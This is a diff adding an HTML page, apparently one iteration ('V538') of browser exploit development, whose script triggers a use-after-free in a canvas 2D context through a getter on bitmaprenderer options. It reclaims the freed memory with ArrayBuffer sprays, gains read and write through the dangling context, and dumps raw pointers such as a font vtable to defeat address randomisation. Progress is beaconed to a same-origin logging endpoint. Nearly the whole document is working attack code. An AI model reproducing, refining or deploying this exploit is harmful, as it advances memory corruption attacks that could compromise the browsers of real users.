@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V538</title>
+<style>body{font:11px monospace;background:#111;color:#0f0;margin:8px}
+#log{white-space:pre-wrap;word-break:break-all}</style>
+</head><body>
+<div id="log">V538 — stateStack buffer reclaim (same-type reclaim + free + AB sweep)
+Loading...</div>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+='\n'+m}
+var T0=Date.now();
+function B(tag,body){
+  var msg='['+(Date.now()-T0)+'ms] '+(body||'');
+  log('>> '+tag+': '+msg);
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V538-'+tag,false);
+  x.setRequestHeader('Content-Type','text/plain');x.send(msg)}catch(e){}
+}
+window.onerror=function(m,s,l,c,e){B('ONERROR',m+' at '+s+':'+l+':'+c)};
+B('BOOT',navigator.userAgent);
+
+// Strategy:
+// 1. Create UAF + same-type reclaim → aliased pair (V535 proven)
+// 2. Through official: 1 save + realize → stateStack on heap (capacity 16)
+// 3. Free the official context (bitmaprenderer on its canvas)
+// 4. DON'T spray 768B ABs (preserve context memory for m_stateStack fields)
+// 5. Sweep AB sizes to reclaim the freed stateStack buffer
+// 6. Read dangling.lineWidth → should read from AB data
+
+var MARK = 42.25;  // lineWidth marker before free
+
+// Phase 1: Create aliased pair via same-type reclaim
+function createAlias() {
+  var c = document.createElement('canvas');
+  c.width = 1; c.height = 1;
+  var inner = null;
+  var s = {};
+  Object.defineProperty(s, 'alpha', {
+    get: function() { inner = c.getContext('2d'); return true; }
+  });
+  c.getContext('bitmaprenderer', s);
+  if (!inner) return null;
+
+  var ctxs = [];
+  for (var i = 0; i < 200; i++) {
+    var nc = document.createElement('canvas');
+    nc.width = 1; nc.height = 1;
+    var nctx = nc.getContext('2d');
+    nctx.lineWidth = 200 + i;
+    ctxs.push({canvas: nc, ctx: nctx});
+  }
+
+  var dlw = inner.lineWidth;
+  if (dlw >= 200 && dlw < 400) {
+    var idx = dlw - 200;
+    return {dangling: inner, official: ctxs[idx].ctx, canvas: ctxs[idx].canvas, idx: idx, ctxs: ctxs};
+  }
+  return null;
+}
+
+// Phase 2: Grow stateStack, free, sweep ABs
+function phase2(alias) {
+  var d = alias.dangling;
+  var o = alias.official;
+
+  // 1 save + set lineWidth + realize
+  o.save();
+  o.lineWidth = MARK;
+  o.globalAlpha = 0.888;
+  o.miterLimit = 77.77;
+  o.lineDashOffset = 55.55;
+  var rlw = o.lineWidth;
+  B('P2-REALIZED','lw='+rlw+' after 1 save');
+
+  // Verify alias
+  var dlw = d.lineWidth;
+  B('P2-ALIAS-CHECK','dangling reads lw='+dlw);
+
+  // Free the official context
+  var s2 = {};
+  Object.defineProperty(s2, 'alpha', { get: function() { return true; } });
+  alias.canvas.getContext('bitmaprenderer', s2);
+  B('P2-FREED','official context freed');
+
+  // Verify stale read (should still work — V536 T7 proved this)
+  try {
+    var slw = d.lineWidth;
+    B('P2-STALE','dangling reads lw='+slw+' after free (expect '+MARK+')');
+    if (slw === MARK) {
+      B('P2-STALE-OK','stale read confirmed');
+    } else {
+      B('P2-STALE-DIFF','stale value different: '+slw);
+    }
+  } catch(e) {
+    B('P2-STALE-CRASH','lineWidth crashed after free: '+e);
+    return false;
+  }
+
+  return true;
+}
+
+// Phase 3: AB sweep
+// stateStack buffer size = 16 * sizeof(State)
+// sizeof(State) ≈ 350-500B → buffer 5600-8000B
+// Also possible: capacity=34 if 32 saves were realized one-by-one
+// With 1 save: capacity = 16 (growth: 1→16 on first append)
+// Buffer = 16 * sizeof(State) ≈ 5600-8000B
+// Sweep from 5000 to 16000 in 64B steps with 300 ABs per step
+function phase3(dangling) {
+  B('P3-START','AB sweep 5000-10000 step=64 count=300');
+  var MIN = 5000, MAX = 10000, STEP = 64, COUNT = 300;
+  var hit = false;
+
+  for (var sz = MIN; sz <= MAX && !hit; sz += STEP) {
+    var spray = [];
+    for (var i = 0; i < COUNT; i++) {
+      var ab = new ArrayBuffer(sz);
+      var u8 = new Uint8Array(ab);
+      // Fill entire buffer with 0x41 so every double-aligned read = 0x4141414141414141
+      for (var j = 0; j < sz; j++) u8[j] = 0x41;
+      spray.push(ab);
+    }
+
+    try {
+      var lw = dangling.lineWidth;
+      if (lw !== MARK && lw !== 1 && !isNaN(lw) && lw !== 0) {
+        B('P3-HIT','SIZE='+sz+' lineWidth='+lw);
+        hit = true;
+        window._hitSpray = spray;
+        window._hitSize = sz;
+        break;
+      }
+    } catch(e) {
+      B('P3-ERR-'+sz,'crash: '+e);
+      break;
+    }
+    spray = null;
+  }
+  if (!hit) B('P3-MISS','no hit 5000-10000');
+  return hit;
+}
+
+// Phase 4: wider sweep
+function phase4(dangling) {
+  B('P4-START','wider sweep 3000-20000 step=128 count=400');
+  var MIN = 3000, MAX = 20000, STEP = 128, COUNT = 400;
+  var hit = false;
+
+  for (var sz = MIN; sz <= MAX && !hit; sz += STEP) {
+    if (sz >= 5000 && sz <= 10000) continue;
+    var spray = [];
+    for (var i = 0; i < COUNT; i++) {
+      var ab = new ArrayBuffer(sz);
+      var u8 = new Uint8Array(ab);
+      for (var j = 0; j < sz; j++) u8[j] = 0x41;
+      spray.push(ab);
+    }
+    try {
+      var lw = dangling.lineWidth;
+      if (lw !== MARK && lw !== 1 && !isNaN(lw) && lw !== 0) {
+        B('P4-HIT','SIZE='+sz+' lineWidth='+lw);
+        hit = true;
+        window._hitSpray = spray;
+        window._hitSize = sz;
+        break;
+      }
+    } catch(e) { B('P4-ERR-'+sz,'crash: '+e); break; }
+    spray = null;
+  }
+  if (!hit) B('P4-MISS','no hit 3000-20000');
+  return hit;
+}
+
+// Phase 5: ultra sweep 1000-65536
+function phase5_sweep(dangling) {
+  B('P5-START','ultra sweep 1000-65536 step=256 count=500');
+  var MIN = 1000, MAX = 65536, STEP = 256, COUNT = 500;
+  var hit = false;
+  for (var sz = MIN; sz <= MAX && !hit; sz += STEP) {
+    if (sz >= 3000 && sz <= 20000) continue;
+    var spray = [];
+    for (var i = 0; i < COUNT; i++) {
+      var ab = new ArrayBuffer(sz);
+      var u8 = new Uint8Array(ab);
+      for (var j = 0; j < sz; j++) u8[j] = 0x41;
+      spray.push(ab);
+    }
+    try {
+      var lw = dangling.lineWidth;
+      if (lw !== MARK && lw !== 1 && !isNaN(lw) && lw !== 0) {
+        B('P5-HIT','SIZE='+sz+' lineWidth='+lw);
+        hit = true;
+        window._hitSpray = spray;
+        window._hitSize = sz;
+        break;
+      }
+    } catch(e) { B('P5-ERR-'+sz,'crash: '+e); break; }
+    spray = null;
+  }
+  if (!hit) B('P5-MISS','no hit in ultra range');
+  return hit;
+}
+
+// Phase 6: Write-through to identify exact offset
+function phase6_write(dangling) {
+  if (!window._hitSize) { B('P6-SKIP','no hit'); return; }
+  B('P6-START','write-through test, AB size='+window._hitSize);
+
+  var WVAL = 1337.7331;
+  dangling.lineWidth = WVAL;
+  B('P6-WROTE','lineWidth='+WVAL+' through dangling');
+
+  var spray = window._hitSpray;
+  for (var i = 0; i < spray.length; i++) {
+    var dv = new DataView(spray[i]);
+    for (var off = 0; off < spray[i].byteLength - 7; off += 8) {
+      var v = dv.getFloat64(off, true);
+      if (v === WVAL) {
+        B('P6-FOUND','AB['+i+'] offset='+off);
+        // Write other fields and scan
+        dangling.globalAlpha = 0.123456789;
+        for (var s2 = 0; s2 < spray[i].byteLength - 7; s2 += 8) {
+          var v2 = dv.getFloat64(s2, true);
+          if (Math.abs(v2 - 0.123456789) < 1e-10) {
+            B('P6-GA','globalAlpha at offset '+s2+' (delta='+(s2-off)+')');
+            break;
+          }
+        }
+        dangling.miterLimit = 77.77;
+        for (var s3 = 0; s3 < spray[i].byteLength - 7; s3 += 8) {
+          var v3 = dv.getFloat64(s3, true);
+          if (Math.abs(v3 - 77.77) < 1e-6) {
+            B('P6-ML','miterLimit at offset '+s3+' (delta='+(s3-off)+')');
+            break;
+          }
+        }
+        dangling.lineDashOffset = 55.55;
+        for (var s4 = 0; s4 < spray[i].byteLength - 7; s4 += 8) {
+          var v4 = dv.getFloat64(s4, true);
+          if (Math.abs(v4 - 55.55) < 1e-6) {
+            B('P6-LDO','lineDashOffset at offset '+s4+' (delta='+(s4-off)+')');
+            break;
+          }
+        }
+
+        // Bidirectional: write AB → read dangling
+        dv.setFloat64(off, 9876.5432, true);
+        var readback = dangling.lineWidth;
+        B('P6-BIDIR','wrote 9876.5432 to AB, dangling reads='+readback);
+
+        window._hitAB = i;
+        window._hitOff = off;
+        return;
+      }
+    }
+  }
+  B('P6-NOTFOUND','write value not found in spray');
+}
+
+// Phase 7: Pointer leak — read raw pointer bytes
+function phase7_leak(dangling) {
+  if (!window._hitOff) { B('P7-SKIP','no hit offset'); return; }
+  B('P7-START','reading raw pointer data');
+  var ab = window._hitSpray[window._hitAB];
+  var dv = new DataView(ab);
+  var lwOff = window._hitOff;
+
+  // State entry starts at lwOff - offsetof(lineWidth in State)
+  // offsetof(lineWidth) ≈ 48 based on source analysis
+  var entryStart = lwOff - 48;
+  B('P7-ENTRY','lineWidth at AB offset '+lwOff+', entry1 starts at ~'+entryStart);
+
+  // Dump pointer fields at known offsets from entry start
+  var fields = [
+    [0, 'unparsedStrokeColor (StringImpl*)'],
+    [8, 'unparsedFillColor (StringImpl*)'],
+    [16, 'strokeStyle.variant[0-7]'],
+    [24, 'strokeStyle.variant[8-15]'],
+    [32, 'fillStyle.variant[0-7]'],
+    [40, 'fillStyle.variant[8-15]'],
+    [168, 'lineDash.m_buffer (ptr)'],
+    [176, 'lineDash.m_size+cap'],
+    [216, 'unparsedFont (StringImpl*)'],
+    [224, 'font.vtable (ptr)'],
+    [232, 'font.FontCascade.weakptr'],
+    [240, 'font.FCD.featureSettings.buffer'],
+  ];
+
+  for (var p = 0; p < fields.length; p++) {
+    var off = entryStart + fields[p][0];
+    if (off >= 0 && off + 8 <= ab.byteLength) {
+      var lo = dv.getUint32(off, true);
+      var hi = dv.getUint32(off + 4, true);
+      var hex = ('00000000'+hi.toString(16)).slice(-8)+('00000000'+lo.toString(16)).slice(-8);
+      B('P7-'+fields[p][0], hex+' '+fields[p][1]);
+    }
+  }
+
+  // Also dump first 32 bytes of entry 0 (before entry 1)
+  // sizeof(State) can be computed from lineWidth offsets of entry 0 and entry 1
+  // entry0.lineWidth is at entryStart - sizeof(State) + 48
+  // But we need sizeof(State) to know where entry0 is...
+  // Let's look for the initial lineWidth (1.0 default) in entry 0
+  B('P7-SCAN-E0','scanning for entry 0 lineWidth=1.0');
+  for (var scan = 0; scan < entryStart; scan += 8) {
+    var v = dv.getFloat64(scan, true);
+    if (v === 1.0) {
+      B('P7-E0-CAND','possible entry0.lineWidth at offset '+scan+' (sizeof(State)='+(lwOff-scan)+')');
+    }
+  }
+}
+
+// Main
+setTimeout(function() {
+  var alias = createAlias();
+  if (!alias) { B('ALIAS-FAIL','no alias created'); return; }
+  B('ALIAS-OK','idx='+alias.idx+' lw='+(200+alias.idx));
+  window._alias = alias;
+
+  if (!phase2(alias)) { B('P2-DEAD','phase2 failed'); return; }
+  window._dang = alias.dangling;
+
+  setTimeout(function() {
+    var d = window._dang;
+    if (phase3(d)) {
+      setTimeout(function(){ phase6_write(d); }, 200);
+      setTimeout(function(){ phase7_leak(d); }, 1500);
+    } else {
+      setTimeout(function() {
+        if (phase4(d)) {
+          setTimeout(function(){ phase6_write(d); }, 200);
+          setTimeout(function(){ phase7_leak(d); }, 1500);
+        } else {
+          setTimeout(function() {
+            if (phase5_sweep(d)) {
+              setTimeout(function(){ phase6_write(d); }, 200);
+              setTimeout(function(){ phase7_leak(d); }, 1500);
+            }
+          }, 500);
+        }
+      }, 500);
+    }
+  }, 200);
+}, 300);
+
+setTimeout(function(){B('COMPLETE','all phases done')}, 60000);
+</script></body></html>
